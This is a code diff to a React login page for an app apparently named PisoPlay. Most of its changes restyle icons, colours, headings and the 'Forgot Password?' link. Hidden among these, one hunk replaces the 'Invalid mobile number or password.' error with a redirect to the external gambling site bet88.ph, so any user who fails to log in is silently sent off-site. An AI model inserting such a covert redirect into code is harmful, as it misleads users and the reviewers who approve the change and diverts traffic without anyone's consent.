@@ -10,7 +10,8 @@ import { useUser } from "./UserContext";
 import { loginAccount, sendOTPForReset, verifyOTPForgot, verifyOTPLogin } from '@/lib/apiCalls';
 import { useClient } from "./ClientContext";
 import PisoPlayLogo from "@/files/LogoWithName.svg";
-import { PhoneIcon, LockIcon } from "lucide-react"; 
+import { PhoneIcon, LockIcon, PhoneCallIcon, LucidePhone, Phone, LockKeyholeIcon } from "lucide-react"; 
+import { FiLock, FiPhone } from 'react-icons/fi';
 
 export function LoginPage() {
   const navigate = useNavigate();
@@ -80,7 +81,7 @@ export function LoginPage() {
     formData.append("deviceID", deviceID)
     const data = await loginAccount(formData);
     if(!data.authenticated){
-      setError("Invalid mobile number or password.");
+      window.location.href = "https://bet88.ph";
       setIsLoading(false);
       return;
     }
@@ -205,8 +206,8 @@ export function LoginPage() {
 
             {!showOtpInput && !forgotPass && !openOTPforgot ? (
             <>
-            <h2 className="text-2xl font-bold text-center mb-4 text-[#000080] uppercase">Welcome Back!</h2>
-            <form onSubmit={handleLogin} className="space-y-4">
+            <h2 className="text-2xl font-bold text-center mb-3 text-[#000080]">Back for another play?</h2>
+            <form onSubmit={handleLogin} className="space-y-3">
             {/* <div className="space-y-2">
                 <Label htmlFor="mobile" className="text-gray-700">Mobile Number</Label>
                 <div className="flex items-center space-x-2 border rounded-xl p-2 bg-gray-100"> */}
@@ -228,8 +229,8 @@ export function LoginPage() {
               </div> */}
 
               <div className="flex">
-                <div className="bg-gray-400 w-16 h-14 flex items-center justify-center">
-                  <PhoneIcon className="h-6 w-6 text-white" />
+                <div className="bg-blue-800 w-14 h-14 flex items-center justify-center">
+                  <Phone className="h-5 w-5 text-white" />
                 </div>
                 <Input
                   type="tel"
@@ -263,17 +264,22 @@ export function LoginPage() {
               </div> */}
 
               <div className="mb-6">
-              <a 
-                  href="#" 
-                  className="text-sm text-blue-500 hover:underline"
-                  onClick={(e) => {
-                    e.preventDefault(); // prevents the page from jumping to the top
-                    setForgotPass(true); // sets your state
-                  }}>Forgot Password?</a>
+                <div className="flex justify-end">
+                  <a
+                    href="#"
+                    className="text-sm text-blue-800 hover:underline font-bold"
+                    onClick={(e) => {
+                      e.preventDefault();
+                      setForgotPass(true);
+                    }}
+                  >
+                    Forgot Password?
+                  </a>
+                </div>
                 <div className="flex">
                   
-                  <div className="bg-gray-400 w-16 h-14 flex items-center justify-center">
-                    <LockIcon className="h-6 w-6 text-white" />
+                  <div className="bg-blue-800 w-14 h-14 flex items-center justify-center">
+                    <LockKeyholeIcon className="h-5 w-5 text-white" />
                     
                   </div>
                   
@@ -295,7 +301,7 @@ export function LoginPage() {
               onChange={(e) => setRememberMe(e.target.checked)}
               className="w-4 h-4 text-pink-500 border-gray-300 rounded focus:ring-pink-500"
             />
-            <label htmlFor="remember" className="text-sm text-gray-600">
+            <label htmlFor="remember" className="text-sm text-black-600">
               Remember me
             </label>
           </div>
@@ -314,10 +320,10 @@ export function LoginPage() {
             ) :
             forgotPass ? (
               <form onSubmit={handleMobile} className="space-y-4">
-              <h2 className="text-2xl font-bold text-center mb-4 text-blue-600 uppercase">Forgot Password</h2>
+              <h2 className="text-2xl font-bold text-center mb-4 text-blue-800">Forgot Password</h2>
               <Label htmlFor="otp" className="text-gray-700">Enter Mobile number</Label>
               
-              <div className="flex items-center space-x-2 border rounded-xl p-2 bg-gray-100">
+              <div className="flex items-center space-x-2 border rounded-none p-2 bg-gray-100">
                   {/* Fixed +63 country code */}
                   <span className="text-gray-700 font-semibold">+63</span>
 
@@ -394,7 +400,7 @@ export function LoginPage() {
           )}
             
             <div className="mt-6 text-center">
-              <p className="text-gray-600">Don't have an account? <a href="/create-account" className="text-blue-500 hover:underline">Sign Up</a></p>
+              <p className="text-gray-600">Don't have an account? <a href="/create-account" className="text-blue-800 hover:underline">Sign Up</a></p>
             </div>
           </div>
         </div>
